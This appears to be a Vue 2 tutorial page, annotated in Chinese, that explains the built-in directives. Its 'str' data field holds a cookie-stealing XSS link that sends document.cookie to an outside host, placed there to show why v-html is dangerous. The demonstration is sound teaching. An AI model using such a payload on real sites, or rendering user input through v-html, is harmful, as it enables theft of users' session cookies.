@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Vue 内置指令</title>
+        <!-- 引入 Vue  -->
+        <style>
+            [v-cloak]{
+                /* 9、选中所有标签属性中中含有 v-cloak 的元素 */
+                display: none;
+            }
+        </style>
+        <script type="text/javascript" src="./vuejs/vue.js"></script>
+        <!-- js阻塞：当vue文件获取阻塞时，后面的一切代码都不会被运行 -->
+        <!-- 9、v-cloak
+                当获取 Vue.js 的 script 写在 body 的最下方且服务器返回此文件很慢的时候，会出现页面渲染了但是 Vue 还没有执行的情况
+                {{mustache}}等都是原始状态
+                作用：Vue 介入的一瞬间此标签属性就会被删除，通过与css标签属性选择器的配合就可以实现对此情况下的样式处理
+         -->
+    </head>
+    <body>
+
+        <!-- 
+            Vue 中的内置指令
+                1、v-bind   (:)                                         --03_数值绑定内详解
+                    单项绑定解析表达式
+                2、v-model:value    (v-model:)                          --03_数值绑定内详解
+                    双向数据绑定
+                3、v-for                                                --16_列表渲染详解
+                    遍历数组/对象/字符串(基于源数据多次渲染元素或模板块)
+                4、v-on     (@)                                         --08_事件绑定及传参详解
+                    绑定事件监听器
+                5、v-if    v-else    v-else-if                          --15_条件渲染详解
+                    条件渲染(根据表达式的值的有条件地渲染元素)
+                6、v-show                                               --15_条件渲染详解
+                    条件展示(根据表达式之真假值，切换元素的display:none)
+                7、v-texts
+                    (1) 作用：向其所在的节点渲染文本内容
+                    (2) v-text 会替换掉节点中的所有内容,如果需更新部分的 textContent，请使用 {{ Mustache }} 插值
+                8、v-html                                               --有安全问题
+                    向指定节点中渲染包含 html 结构的内容
+                9、v-cloak(没有值)
+                    解决网速慢时页面出现 {{mustache}} 的问题，将 script 引入标签写在 head 内也可以解决这个问题
+                    (1) 本质是一个特殊标签属性，Vue实例创建完毕并接管容器后，就会立刻删除 v-cloac 属性
+                    (2) 使用 css 配合 [v-cloak]{} 可以解决网速慢时页面展示出现 {{mustache}} 的问题
+                10、v-once(没有值)
+                    初次渲染完成，后续节点内容不随数据变化响应式变化
+                    (1) v-once 所在节点在初次动态渲染后，就是为静态内容了
+                    (2) 之后数据的改变都不会引起 v-once 所在结构的更新，可以用于优化性能
+                11、v-pre
+                    (1) 跳过所在节点的 Vue 编译过程
+                    (2) 可以利用 v-pre 跳过没有指令语法、插值语法的节点，从而加快编译速度
+         -->
+        
+        <div id="root">
+            <!-- {{ Mustache }}插值语法 -->
+            <div>{{name}}</div>
+            <!-- 7、v-text 更新元素的 textContent -->
+            <div v-text="name">
+                知识点:v-text的值会替换掉标签中的内容(这句话不会被显示,且v-text内容中如果有标签属性会被解析为文本)
+            </div>
+            
+            <div v-html="name"></div>
+            <!-- 展示安全性问题 -->
+            <div v-html="str"></div><br>
+            <!-- 8、v-html
+                    1、作用：v-html 属于支持结构解析的 v-text
+                        向指定节点中渲染包含 html 结构的内容
+                        (内容按普通 HTML 插入，不会作为 Vue 模板进行编译)
+                    2、与插值语法的区别：
+                        (1) v-html 会替换掉节点中所有的内容，{{Mustache}} 不会
+                        (2) v-html 可以识别 html 结构
+                    3、安全性问题！：
+                        (1) 在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击
+                        (2) 只在可信内容上使用 v-html，永不要用在用户提交的内容上使用 v-html
+             -->
+             <!-- 10、v-once 后续内容不随数据变化响应式变化 -->
+             <h2 v-once>初始化的n值是：{{n}}</h2>
+             <button @click="n++">n++，目前n={{n}}</button><br>
+             <!-- 11、v-pre 跳过所在节点的 Vue 编译过程 -->
+             <h2 v-pre @click="n++">v-pre{{n}}</h2>
+        </div>
+
+        <script type="text/javascript">
+            Vue.config.productionTip = false        // 阻止 Vue 在启动时生成生产提示，先调整整体配置再使用 vue
+
+            new Vue({
+                el: '#root',
+                data: {
+                    name: '<h2>hello world</h2>',
+                    str: '<a href=javascript:location.href="http://bilibili.com?"+document.cookie>是兄弟就来砍我</a>',
+                    /*      v-html 的安全问题
+                        用户可能会写这样的内容发帖，如果直接用v-html展示用户编辑的内容，其他点击者容易被 xss 攻击
+                        直接将包含结构的字符串直接解析成标签使用本就是危险的行为
+                        如果做 cookie 窃取会将网址换成自己的服务器，这样可以拿到用户本网站下倒霉蛋所有的cookie，这样的作法就是 xss 攻击
+                    */
+                   n: 1,
+                }
+            })
+
+        </script>
+    
+    </body>
+</html>
